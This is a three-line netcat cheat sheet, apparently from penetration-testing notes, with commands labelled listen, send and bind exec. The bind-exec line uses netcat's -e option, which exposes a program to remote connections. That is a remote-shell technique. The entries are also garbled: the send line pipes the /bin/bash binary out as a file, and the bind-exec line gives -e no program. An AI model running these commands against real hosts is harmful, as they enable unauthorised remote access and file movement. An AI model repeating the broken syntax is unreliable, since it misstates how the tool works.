# Listen:
nc -nlvp [PORT] > file

# Send:
nc -nv [IP] [PORT] < /bin/bash

# Bind exec:
nc -nlvp [PORT] -e < file
